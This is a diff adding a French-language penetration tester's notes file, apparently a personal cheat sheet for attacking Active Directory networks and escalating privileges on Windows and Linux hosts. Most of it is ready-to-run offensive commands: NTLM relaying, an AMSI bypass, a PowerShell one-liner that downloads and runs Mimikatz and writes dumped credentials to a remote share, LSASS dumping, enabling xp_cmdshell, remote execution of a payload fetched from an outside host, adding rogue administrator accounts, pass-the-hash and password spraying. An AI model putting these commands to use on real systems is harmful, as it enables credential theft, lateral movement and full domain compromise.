@@ -1,0 +1,568 @@
+brouillon.txt
+
+Les trucs à faire sans compte :
+	responder
+		cassage de hash
+		ntlmrelay => relay sur smb sans signature
+					 relay sur de l'auth http (il faut trouver des mires d'auth basic)
+	share anonymes
+		lecture => mdp dans fichiers / info senssibles
+		ecriture => lnk malveillant => responder/relay
+	ldap anonymes
+		mdp description
+		asreproast
+		dnshostname => extraction des fqdn pour nessus / nmap
+	ftp
+		lecture => mdp / info senssibles
+		écriture => lnk malveillant => responder/relay
+	smtp
+		enum user
+		send mail anon
+	exploits
+		tomcat manager
+		jenkins / autre
+		zerologon
+		eternalblue
+		bluekeep
+		...
+	creds par defaut
+		https://github.com/ihebski/DefaultCreds-cheat-sheet
+
+les trucs à faire avec un compte :
+	chercher ldap :	
+		les mdp dans les description
+		les mdp dans les champs ms-Mcs-AdmPwd (mdp laps parfois lisible sur certaines machines)
+	les share (voir si local admin pour psexec)
+	rdp
+	mssql
+	ACL
+	kerberoast
+	petitpotam https://www.truesec.com/hub/blog/from-stranger-to-da-using-petitpotam-to-ntlm-relay-to-active-directory
+	adcs exploits
+	print nightmare https://0xdf.gitlab.io/2021/07/08/playing-with-printnightmare.html
+		find dc with spooler 
+			for ip in $(cat dc-ip); do echo "====== $ip ======" ;impacket-rpcdump @$ip | egrep 'MS-RPRN|MS-PAR'; done
+	noPac https://exploit.ph/cve-2021-42287-cve-2021-42278-weaponisation.html (il y a un exploit automatisé dispo quelque part sur github en ptyhon)
+
+les trucs à faire lors d'un accès à un linux pour privesc:
+	sudo -ls => privesc gratos (gtfobins)
+	suid / guid (gtfobins)
+	droits d'écriture dans /usr/lib/systemd/system et /etc/systemd/system si écriture dans un .service => win
+	.ssh, history, mdp dans fichiers
+	su
+	linpease pour enum
+	exploit kernel/os
+
+les trucs à faire lors d'un accès à un windows pour privesc:
+	unquoted service path
+	dll highjack
+	seprivilege
+	enumeration des fichiers
+	seatbelt winpeas itm4n/PrivesccCheck.ps1
+	exploit os
+	lazagne
+
+ip configuration
+	dhclient => call dhcp
+	dhclient -r => kill dhcp configuration
+	manuel :
+		ancien
+			ifconfig eth0 X.X.X.X netmask 255.255.255.0 up
+			route add default gw X.X.X.1
+			echo "nameserver X.X.X.Y" > /etc/resolv.conf
+		nouveau
+			ip address add X.X.X.X/24 dev eth0
+			ip route add default via X.X.X.1
+
+couche 2 attaque
+	yersinia (à creuser)
+
+discovery
+	exemple génération d'une liste d'ip de routeur (ip en .1 ou .254 en général suivant le réseau) pour trouver des sous réseaux valides
+		for (( c=0; c<=255; c++ )) do echo 192.172.$c.1 > ip_tofind; done
+		for (( c=0; c<=255; c++ )) do echo 192.0.$c.1 >> ip_tofind; done
+		for (( c=0; c<=255; c++ )) do echo 192.168.$c.1 >> ip_tofind; done
+		for (( c=0; c<=255; c++ )) do echo 10.0.$c.1 >> ip_tofind; done 
+		for (( a=0; a<=255; a++ )) do ; for (( b=0; b<=255; b++ )) do echo 172.$a.$b.1 >> ip_tofind; done done 
+		fping -q -a -f ip_tofind | ip_discovered
+	fping -q -a -g 10.0.0.0/8 | tee ip_list
+	nmap liste ip générée
+		nmap --top-port XXXX  -iL ip_list
+	nmap discret
+		nmap --disable-arp-ping -sS -T1 -Pn -n -vv --open -oA results -iL ip_list -p XX -g 53 -S X.X.X.IP_USURP -e eth0
+	nmap semi discret (top port + résolution dns -n)
+		nmap --disable-arp-ping -sS -T3 -Pn -vv --open --top-port 1000 -iL ip_list -oA top1000_pingable_ip
+	nmap options
+		Pn : no ping
+		--open : only open ports
+	sub domain enum :
+		ffuf -c -o sub-domains.txt -w /usr/share/seclists/Discovery/DNS/shubs-subdomains.txt -u http://FUZZ.domain.local
+		(à faire aussi en https)
+		et / ou
+		dnsrecon -r range -n <ip_dns_server>
+
+	masscan -p 21 -iL live_host | tee ftp_hosts | awk '{print $6}' | tee ip_ftp
+
+	nmap interesting ports
+		nmap -p 21,22,25,445,1433,3306,3389,5985,5800,5801,5900,5901 -T4 -iL full_ip_dns_final -oA bu_scan_full_final -vv --open -Pn --max-retries 2  
+
+
+responder & relay
+	crackmapexec smb <ip_list> --gen-relay-list relay_list.txt
+	configurer responder (responder.conf) pour désactiver HTTP et SMB et l'utiliser en couple avec ntlmrelay
+	responder -I eth0 -w -r -f --lm
+	impacket-ntlmrelayx -of ntlm_capture 
+	impacket-ntlmrelayx -of ntlm_capture -tf smb_nosign_ip_list -smb2support -i
+	impacket-smbrelayx -e payload.exe -h X.X.X.X
+	impacket-smbrelayx -h X.X.X.X -c whoami -outputfile test_smbrelay
+	dhcp responder (à lancer en début de journée / aprem, les ordinateurs pown devront reboot pour re avoir internet si jamais le responder est kill) :	
+		change /etc/responder/Responder.conf to remplace WPADScript with current IP
+		responder -I eth0 -rPdvf --lm
+		note : la dernière version de responder permet de set ip via argument donc plus besoin de changer la conf
+
+	socks 
+		impacket-ntlmrelayx -tf relay_list.txt -of netntlm_ntlm2 -socks -smb2support
+		responder -I eth0 -w --lm (-P -d en plus si envie de tout casser)
+		proxychains:	
+			nano /etc/proxychains.conf 
+			socks4 10.X.X.X 1080
+		exemples
+			proxychains crackmapexec smb relay_list.txt -u "INTERCEPTED_USER" -p "" -d "DOMAIN" --shares
+			proxychains smbclient -N -U INTERCEPTED_USER -L 10.X.X.X   
+
+mitm6 & relay
+	mitm6 -i eth0 -d domain.local
+	impacket-ntlmrelayx -tf relay_list.txt -of ntlmv2_output.txt -socks -smb2support 
+	# pour virer les user doublons : 
+	awk -F: '{if (seen[$1]++) next} 1' ntlmv2_output.txt
+
+powershell
+	exécution à distance de script
+		powershell -ExecutionPolicy bypass \\X.X.X.X\Share\script.ps1
+		powershell -ExecutionPolicy bypass 'IEX (New-Object Net.WebClient).DownloadString("http://10.x.x.x/Nini.ps1"); Invoke-Mimikatz -Command privilege::debug; Invoke-Mimikatz -DumpCreds; > \\10.x.x.x\out.txt'
+
+
+find file
+	linux
+		regex
+			grep -rnw '/path/to/somewhere/' -e 'pattern
+		word
+			grep -Ril "text-to-find" /
+		word avec context
+			grep -Rio -P -P '.{0,3}password.{0,20}' ./
+		file name
+			find . -name "*.txt"
+		file name grep
+			find ./ -size -3M -type f \( -iname \*.txt -o -iname \*.cnf -o -iname \*.config -o -iname \*.xml -o -iname \*.yaml -o -iname \*.conf -o -iname \*.inf -o -iname \*.url -o -iname \*.init -o -iname \*.ini -o -iname \*.json -o -iname \*.yml -o -iname \*.cfg -o -iname \*.msg -o -iname \*.one -o -iname \*.php \) -exec echo {} \; -exec grep -i 'passw\|pwd\|mdp\|passe\|cred' {} \;
+		faster
+				find ./ -size -1M -type f \( -iname \*.txt -o -iname \*.cnf -o -iname \*.config -o -iname \*.yaml -o -iname \*.conf -o -iname \*.inf -o -iname \*.url -o -iname \*.init -o -iname \*.ini -o -iname \*.json -o -iname \*.yml -o -iname \*.cfg -o -iname \*.msg -o -iname \*.one -o -iname \*.php \) -exec echo {} \; -exec grep -i 'passw\|pwd\|mdp\|passe\|cred' {} \;
+	windows
+		(Get-ChildItem ".\" -recurse -include "*.txt", "*.bat", "*.ps1", "*.sh", "*.conf", "*.config" | Select-String "passw", "passe", "credential" -List | Write-host) 2>$null
+		
+		(Get-ChildItem ".\" -recurse -include "*.txt", "*.bat", "*.ps1", "*.sh", "*.conf", "*.config" | Select-String "password =", "password=", "password :", "password:", "password\" =", "password\"=", "password\" :", "password\":", "pass =", "pass=", "pass :", "pass:", "pass\" =", "pass\"=", "pass\" :", "pass\":", "DOMAIN\\" -List | Write-host) 2>$null
+ldap
+	ldapdomaindump -u "xx.net\user" -p "passord" -d ',' -o <folder> xx.net
+	no auth search
+		ldapsearch -x -H ldap://XX.XX.XX.XX:389 -b "DC=xx,DC=xx,DC=xx,DC=net" "(&(description=*password*))" "sAMAccountName" "description" -E pr=1000/noprompt
+		ldapsearch -x -H ldap://XX.XX.XX:xx:389 -b "DC=XX,DC=XX,DC=XX,DC=net" "(&(objectClass=user)(!(objectClass=computer))(description=*))" "sAMAccountName" "description" -E pr=1000/noprompt > users_with_desc
+		ldapsearch -x -H ldap://xxx:389 -b "DC=xx" "(objectClass=trustedDomain)" "distinguishedName" -E pr=1000/noprompt    
+	search in specific OU
+		ldapsearch -x -H ldap://xxx:389 -b "OU=YY,DC=XX" "(x=x)" "distinguishedName" -E pr=1000/noprompt
+	get computers FQDN in specific OU
+		ldapsearch -x -H ldap://xxx:389 -b "OU=YY,DC=XX" "(&(objectClass=user)(objectClass=computer))" "dNSHostName" -E pr=1000/noprompt | grep dNSHostName | awk '{print $2}'
+	get users in specific OU
+		ldapsearch -x -H ldap://xxx:389 -b "OU=YY,DC=XX" "(&(objectClass=user)(!(objectClass=computer)))" "sAMACCountname" -E pr=1000/noprompt
+	search LAPS creds readable 
+		ldapsearch -D -D "CN=xx,OU=xx,DC=xx,DC=xx,DC=xx,DC=net" -w "PASSWORD" -H ldap://xx.xx.xx.net:389 -b "DC=xx,DC=xx,DC=xx,DC=net" -b "DC=xx,DC=xx,DC=xx,DC=xx" "(ms-Mcs-AdmPwd=*)" "dNSHostName" "ms-Mcs-AdmPwd"
+	recherche auth 
+		ldapsearch -D "NETBIOS\samaccountname" -w "PASSWORD" -H ldap://xx.xx.xx.net:389 -b "DC=xx,DC=xx,DC=xx,DC=net" "(sAMAccountName=xx)" "sAMAccountName" "description" "memberOf"
+	ldap extract users pour spray
+		ldapsearch -x -H ldap://xxxx.xx:389 -b "DC=xxxx,DC=net" "(&(objectClass=user)(!(objectClass=computer))(!(servicePrincipalName=*))(sAMAccountName=*)(pwdLastSet=*)(badPasswordTime=*))" "sAMAccountName" "pwdLastSet" "badPasswordTime" -E pr=1000/noprompt > users_ldap
+	rechercher potentiel ADCS
+		todo (configuration>Services>Public Key Services)
+	rechercher OU par nom
+		
+
+powerview enum (reconnaissance AD depuis un post de pentest, pour être plus manuel et "discret", sinon je recommande plutot bloodhound et pingcastle)
+	disable antivirus / amsi bypass & load module
+		[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
+		Set-ExecutionPolicy bypass
+		Import-Module -DisableNameChecking .\Recon
+
+	get acl for certain object
+		$password = ConvertTo-SecureString 'password' -AsPlainText -Force
+		$creds = New-Object System.Management.Automation.PSCredential('DOMAIN\user', $password)
+		Get-ObjectAcl -Credential $creds -Identity sAMAccountName -domain test.local -ResolveGUIDs
+
+smtp
+	sendEmail -t recipent@domain.fr -f adm@domain.local -s 192.X.X.X -u Test -m "Ceci est un test" -o tls=no
+
+
+bloodhound
+	extract
+		depuis une machine non jointe
+			runas /netonly /user:USER@domain.local cmd.exe
+			Sharphound.exe --DomainController X.X.X.X -c All
+		pour jointe 
+			Sharphound.exe -c All
+		ps1
+			Invoke-Bloodhound -CollectionMethod All
+	mount :
+		avoir un neo4j local qui tourne avec creds par défaut
+		drag & drop .zip vers fenetre bloodhound.exe
+		on a un serveur interne pour les analyses d'extract sinon
+ 	queries
+ 		MATCH (m) WHERE m.owned=TRUE return m
+ 		MATCH (m) WHERE m.owned=TRUE WITH m MATCH p=(m)-[*1..]->(n) RETURN p
+
+adcontrolpath
+	extract :
+		runas /netonly /user:USER@domain.local "powershell.exe -ep bypass"
+		Import-Module -DisableNameChecking .\ADCP
+		Get-ADCPDump -outputDir dump.a.com -domainController a.com -domainDnsName a.com
+	mount neo4j :
+		Import-Module -DisableNameChecking .\ADCP
+		Prepare-ADCPDump -inputDir dump.a.com -domainDnsName a.com
+		$instance = Import-ADCPDump -inputDir dump.a.com -domainDnsName a.com
+		$instance | Start-ADCPInstance
+
+exploit ACL
+	BloodyAD
+		bloodyAD -u samacount -d domain.net -p password --host dc.domain.net getObjectAttributes targetsama
+	hacker recipes
+	payloadallthethings
+
+création powershell obfusque:
+		pwsh (pour lancer via linux)
+		Import-Module ./Invoke-Obfuscation/Invoke-Obfuscation.psd1
+		Invoke-Obfuscation
+		SET SCRIPTPATH /xx/xx/xx.ps1
+		TOKEN\ALL\1
+		OUT /xx/xx/obfxx.ps1
+
+share
+	todo 
+		tester pour l'enum https://github.com/SnaffCon/Snaffler 
+	anon log
+		smbclient //X.X.X.X/Share -U ""%""
+	anon lister
+		smbclient --no-pass -L ////X.X.X.X
+	auth log
+		smbclient //X.X.X.X/Share -U "login"%"mdp"
+	crackmapexec
+
+	mount
+		mount -t cifs -o "domain=XX,username=XX,password=XX" //XX/XX /mnt/XX
+		umount /mnt/xx
+	psexec
+		prérequis : droite d'écriture sur Admin$
+			module psexec msf ou exectuble modifié psexec
+
+web
+	cat iplist.txt | aquatone -ports XX,XX,XX,...
+	cat iplist.txt | aquatone -ports small|medium|large|xlarge
+	small = 80,443
+	medium = 80, 443, 8000, 8080, 8443 (default)
+	large = 17 ports
+	xlarge = 65 ports:
+
+tools compilés
+	https://github.com/Flangvik/SharpCollection
+
+dump lsass & mimikatz
+	.\rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump 624 C:\temp\lsass.dmp full
+	procdump.exe -accepteula -r -ma lsass.exe lsass.dmp
+	sekurlsa::minidump lsass.dmp
+	./spraykatz.py -u user -p password -t 192.168.1.0/24
+	lsassy -d test.lab -u user -p password 192.168.0.xx
+	full ram dump : 
+		https://github.com/Velocidex/WinPmem
+		puis volatility3 (install avec requirements.txt pour avoir tous les packages)
+			https://github.com/volatilityfoundation/volatility3
+			python vol.py -f mem.raw windows.lsadump.Lsadump
+	dump en live :
+		privilege::debug
+		sekurlsa::logonpasswords
+		sekurlsa::logonPasswords full
+	dump ticket :
+		sekurlsa::tickets /export
+	analyse dump :
+		sekurlsa::minidump lsass.dmp
+		sekurlsa::logonPasswords
+
+crackmapexec
+	/!\ CME marque "pwn3d" quand exécuté contre des Linux
+	si nécessaire en docker
+		install docker 
+			docker pull byt3bl33d3r/crackmapexec
+		run
+			docker start crackmapexec
+			docker exec -it crackmapexec sh
+	share smb
+		sur une liste d'ip dans un fichier : 
+			crackmapexec smb 445_ip -u '' -p '' --shares
+		sur une ip :
+			crackmapexec smb XX.XX.XX.XX -u '' -p '' --shares
+		sur un sous réseau : 
+			crackmapexec smb XX.XX.XX.XX/XX u '' -p '' --shares
+        autres options :
+        	--session, disks, loggedon-users, users, groups, local-groups
+		si read/write sur admin$:
+			-x whoami
+			--sam
+			--lsa
+			--ntds (pour un dc)
+			--sessions
+		utiliser --local-auth pour connexion locale
+	ldap 
+		perform asrep / kerberoast
+			crackmapexec ldap IP -u '' -p '' --asreproast output.txt
+         	crackmapexec ldap IP '' -p ''  --kerberoasting output.txt
+        enum :
+			--trusted-for-delegation
+			--password-not-required
+			--admin-count         
+			--users              
+			--groups      
+		Modules: 
+			crackmapexec ldap IP -u '' -p '' -M adcs
+				MAQ : Retrieves the MachineAccountQuota domain-level attribute
+				adcs : Find PKI Enrollment Services in Active Directory and Certificate Templates Names
+				get-desc-users : Get description of the users. May contained password
+				laps : Retrieves the LAPS passwords
+				user-desc : Get user descriptions stored in Active Directory
+
+remote exec
+	ftp
+		cat 21_ips | while read line; do wget --tries=1 ftp://anonymous:anonymous@$line; done
+
+	SMB
+		impacket-smbexec "DOMAIN/user:password"@X.X.X.X 
+	rdp (xvfb-run = pas de x11)
+		cat ips_3389 | while read line; do echo $line; xvfb-run xfreerdp /v:$line /cert-ignore /u:<user> /d:<domain> /p:<password> +auth-only; done
+	winrm
+		evilwinrm
+			todo 
+		pssession
+			truster les connexions vers d'autres pc :
+				Enable-PSRemoting -Force
+				Set-Item wsman:\localhost\client\trustedhosts *
+			etablir une connexion :
+				Enter-PSSession -ComputerName XX.local -Credential DOMAIN\user
+			executer une commande :
+				Invoke-Command -ComputerName XX -ScriptBlock {whoami /all} -Credential DOMAIN\user
+			clear les trusts :
+				Clear-Item -Path wsman:\localhost\client\trustedHosts
+	psexec
+		.\PsExec.exe \\XX.local -u DOMAIN\User -p password -h powershell.exe "whoami /all"
+		impacket-psexec "DOMAIN/user:password"@X.X.X.X 
+		avec ntlm
+			impacket-psexec -hashes XXXXXXXXXXXXXXXXXXXXXXXXXX:XXXXXXXXXXXXXXXXXXXXXXXXXX "./Administrator"@X.X.X.X
+	wmic
+		impacket-wmiexec "DOMAIN/user:password"@X.X.X.X 
+		test it
+			wmic /node:"xx.local" /user:DOMAIN\User computersystem list brief /format:list
+	 	empire agent
+	 		wmic /node:"xx.local" /user:DOMAIN\User path win32_process call create "*empire launch string*"
+	service control manager
+		SCShell.exe 192.168.197.131 XblAuthManager "C:\windows\system32\cmd.exe /c C:\windows\system32\regsvr32.exe /s /n /u /i://your.website/payload.sct scrobj.dll" . administrastor Password
+		ou manuellement avec des outils windows :
+			runas /netonly /user:USER@domain.local cmd.exe
+			sc \\xx.local create xx_temp_service start=manual binpath="\\X.X.X.X\Share\executeps.exe"
+			sc \\xx.local start xx_temp_service
+			sc \\xx.local delete xx_temp_service
+	remote dcom execution
+		impacket-dcomexec "DOMAIN/user:password"@X.X.X.X
+		ou 
+		via powershell
+			$a = [System.Activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application.1","127.0.0.1"))
+			$a.Document.ActiveView.ExecuteShellCommand("cmd",$null,"/c hostname>c:\test.txt", "7")
+
+pingcastle
+	PingCastle.exe --server XX.XX --user XX --password XX --healthcheck --no-enum-limit
+
+net
+	set COMMAND net user banane mdp /add
+	set COMMAND net localgroup Administrateurs banane /add
+	net localgroup Administrators domainName\domainGroupName /ADD
+
+pssession
+	methode 1
+		runas /netonly /user:USER@domain.local cmd.exe
+		Enter-PSSession -ComputerName xxx.local
+	methode 2
+		Enter-PSSession -ComputerName xx.local -Credential DOMAIN\USER
+oracle 
+	scanner/oracle/tnslsnr_version
+	scanner/oracle/oracle_login
+
+mssql
+	//activate rce
+	EXECUTE sp_configure 'show advanced options', 1;
+	RECONFIGURE;
+	EXECUTE sp_configure 'xp_cmdshell', 1;
+	RECONFIGURE;
+	xp_cmdshell "whoami";
+
+	xp_cmdshell 'net localgroup "Remote Desktop Users"';
+
+
+	EXECUTE sp_configure 'xp_cmdshell', 0;
+	EXECUTE sp_configure 'show advanced options', 0;
+	RECONFIGURE;
+
+	//fw bypass
+		xp_cmdshell "netsh interface portproxy add v4tov4 listenport=49672 listenaddress=0.0.0.0 connectport=445 connectaddress=localhost";
+		xp_cmdshell "netsh interface portproxy add v4tov4 listenport=49673 listenaddress=0.0.0.0 connectport=135 connectaddress=localhost";
+	sur la linux
+		socat tcp-listen:445,reuseaddr,fork,bind=127.0.0.1 tcp:10.0.0.0:49672
+		socat tcp-listen:135,reuseaddr,fork,bind=127.0.0.1 tcp:10.0.0.0:49673
+		cme localhost
+
+	/cleanup
+	xp_cmdshell "netsh interface portproxy delete v4tov4 listenport=49672 listenaddress=0.0.0.0";
+	xp_cmdshell "netsh interface portproxy delete v4tov4 listenport=49673 listenaddress=0.0.0.0";
+
+	//ntlm request
+	xp_dirtree '\\ip\a'
+
+	
+
+bash
+	for loop
+		for (( c=0; c<=255; c++ )) do echo $c; done
+		for (( c=0; c<=255; c++ )) do fping -q -a -g 10.$c.0.0/16 | tee ip_list_$c; done
+	while loop
+		cat file | while read line; do echo $line; done
+
+
+listening ping
+	sudo tcpdump -i eth0 icmp and icmp[icmptype]=icmp-echo
+
+
+spray
+	crackmapexec smb <IP> -u users.txt -p passwords.txt
+	crackmapexec ldap <IP> -u users.txt -p passwords.txt
+	kerbrute passwordspray -d domain.local -o output_spray.txt user_list.txt "Password"
+
+generate wordlist from file
+	grep -o -E '\w+' file > out
+	sort -u out -o out
+
+spider
+	rdp find where user can connect (may not work)
+		hydra -l USER -p PASSWORD -M file_ip rdp | tee rdp_conn
+
+sockS5 
+	forward vers un host qui forward vers un autre le tout en ssh :
+		cela va ouvrir le tunel sur le port 9051. L'option J permet de chain
+			ssh -D 9051 -J user1@host1 user2@host2
+		rdp à travers un socks5
+			xfreerdp /proxy:socks5://localhost:9051 /v:X.X.X.X:3389
+	socks5 server pour machine compromie: 
+		shinysocks (pas flag)
+		chisel (flag)
+	forward les connexion d'un process vers du sockS5:
+		edit /etc/proxychains.conf pour mettre ip / port du server socks
+		proxychains <Command>
+
+portforwarding 
+	netsh interface portproxy add v4tov4 listenport=49672 listenaddress=0.0.0.0 connectport=445 connectaddress=localhost
+
+path the hash (pth)
+	impacket-psexec -hashes :XXXXXXXXXXXXXXXXXXXXX Administrateur@server.domain.local
+
+path the ticket (ptt)
+	request ticket avec un certificat
+		Rubeus.exe asktgt /user:XX /certificate:base64== /ptt /domain:domain.local /dc:x.x.x.x /nowrap
+	use ticket on linux
+		kirbi2ccache ticket.kirbi /pathto/krb5cc_ticket
+		export KRB5CCNAME=/pathto/krb5cc_ticket
+		impacket-secretdumps domain.local/'user'@'server.domain.local' -k -no-pass
+
+shadow credential (generic all/write on computer / user)
+	python3 pywhisker.py -d "domain.local" -u "user1" -p "complexpassword" --target "user2" --action "add" --filename test1
+	python3 PKINITtools/gettgtpkinit.py -cert-pfx test1.pfx -pfx-pass <pass généré étape précédente> domain.local/user2 user2.ccache
+	python3 PKINITtools/getnthash.py -key <key générée étape précédente> domain.local/user2
+	python3 pywhisker.py -d "domain.local" -u "user1" -p "complexpassword" --target "user2" --action "clear"
+
+target kerberoast (gernic all user)
+	python3 addspn.py -u domain\\user1 -p password1 -t target1 -s target1/xx_spn domain.local
+	python3 targetedKerberoast.py --request-user target1 -u user1 -p password1 -d domain.local
+
+
+elasticsearch	
+	get index list
+		http://xx:9200/_cat/indices
+	get data from index
+		http://xx:9200/INDEX_NAME/_search
+
+gnamp
+
+	•	Afficher la liste des IP avec le port 22 ouvert en ligne et séparées par une virgule (parfait pour c/c dans un set RHOSTS sur msf) :
+	cat result.gnmap  | awk 'BEGIN { ORS=", " }; /22\/open/ {print $2}'
+
+	•	Afficher la liste des IP avec le port 22 ouvert, une IP par ligne :
+	cat result.gnmap  | awk '/22\/open/ {print $2}'
+
+	•	Afficher la liste des ports ouverts et le nombre de fois qu’ils sont ouvert (un port par ligne) :
+	cat result.gnmap  |  grep -o -P " [0-9]{1,5}/open" | sed 's/\/open//' | sort -n | awk 'BEGIN {cur_port = 0; counter = 0; } NF { if(cur_port == $0) { counter++ } else { print cur_port " " counter; counter = 1; cur_port = $0}}'
+
+	•	Afficher le nombre de fois que le port 10000 est ouvert
+	cat result.gnmap | grep "10000/open" | wc | awk '{print $1}'
+
+	•	Afficher tous les hosts et pour chaque host les ports ouverts :
+	cat result.gnmap | grep "/open" | awk 'match($0,/([0-9]{1,3}\.){3}[0-9]{1,3}/){ print substr($0, RSTART, RLENGTH); while(match($0,/[0-9]{1,5}(\/open)/)){printf "%s, ",substr($0, RSTART, RLENGTH);$0=substr($0, RSTART+RLENGTH)}; print "\n";}' | sed 's/\/open//g' | sed ':a;N;$!ba;s/, \n/\n/g'  
+
+	•	Créer fichiers port = liste ip
+	for port in $(cat *.gnmap | grep -o -P "[0-9]{1,5}/open" | sed 's/\/open//' | sort | uniq); do touch ips_$port; cat *.gnmap |  awk '/'$port'\/open/ {print $2}' | sort | uniq  >> ips_$port; done
+
+	Créer fichiers port = liste hostname
+	for port in $(cat *.gnmap | grep -o -P "[0-9]{1,5}/open" | sed 's/\/open//' | sort | uniq); do touch dns_$port; cat *.gnmap |  awk '/'$port'\/open/ {print $3}' | sed -r 's/[()]+//g' | sed '/^$/d' | sort | uniq  >> dns_$port; done
+
+	Créer fichiers service = liste dns
+	for service in $(cat *.gnmap | grep -o -P "open(.*?)[,\s]" | grep -o -P "//(.*?)///" | sed 's/\///g' | sort -u); do touch dns_$service; cat *.gnmap |  awk '/'$service'/ {print $3}' | sed -r 's/[()]+//g' | sed '/^$/d' | sort | uniq  >> dns_$service; done
+
+	Créer fichiers service = liste ip
+	for service in $(cat *.gnmap | grep -o -P "open(.*?)[,\s]" | grep -o -P "//(.*?)///" | sed 's/\///g' | sort -u); do touch ips_$service; cat *.gnmap |  awk '/'$service'/ {print $2}' | sort | uniq  >> ips_$service; done
+
+	list ip/dns to metasploit
+	awk 1 ORS=", " fichier
+
+
+privesc windows (à compléter)
+	get env variable
+		cmd > set
+		powershell > dir env:
+		powershell > Get-ChildItem Env:
+	get history
+		powershell > (Get-PSReadlineOption).historySavePath 
+	get wsus server, si http => vuln exploitable pour compromettre le serveur
+		reg query HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate /v WUServer 
+	get install policy (si les deux à 0x1 => tout user peu run des *.msi en nt system)
+		reg query HKLM\Software\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
+		reg query HKCU\Software\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
+	check si laps installé
+		reg query "HKLM\Software\Policies\Microsoft Services\AdmPwd" /v AdmPwdEnabled
+	unquoted service path
+		wmic service get name,displayname,pathname
+	droits sur dossier où est le binaire du service
+		todo
+	droits de modif sur le service
+		todo
+	get file perm recurs
+		accesschk.exe -uwdqs <DOMAIN>\<user> C:\*.*
+		peut aussi être fait avec icacls si sysinternal bloqué :
+			icalcs "C:\*" 
+			todo : filtrer l'output pour ce qui nous interesse*
+	runas de cred sauvegardées
+		lister les creds save
+			cmdkey /list
+		runas /savecred /user:XX\XX "XX.exe"
+	iis creds
+		system32/inetsrv/config/applicationHost.config
+		type c:\windows\system32\inetsrv\config\applicationHost.config
+		trouver une entrée avec password, si y en a :
+			appcmd list apppools
+			puis 
+			appcmd list apppool "nom_pris_dans_la_liste_de_la_commande_précédente" /text:*
